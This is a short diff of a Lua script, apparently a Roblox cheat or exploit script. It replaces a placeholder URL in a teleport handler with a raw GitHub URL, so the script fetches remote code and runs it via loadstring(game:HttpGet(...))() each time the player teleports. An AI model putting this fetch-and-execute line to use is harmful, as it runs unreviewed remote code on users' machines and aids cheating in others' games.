@@ -44,7 +44,7 @@ LocalPlayer.OnTeleport:Connect(function(state)
         Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
         HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
         Humanoid = Character:WaitForChild("Humanoid")
-        loadstring(game:HttpGet('xxxxxxxxxx'))()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/hyonkey/txt-ohioffts/refs/heads/main/ohioffts.txt'))()
     ]])
 end)
 
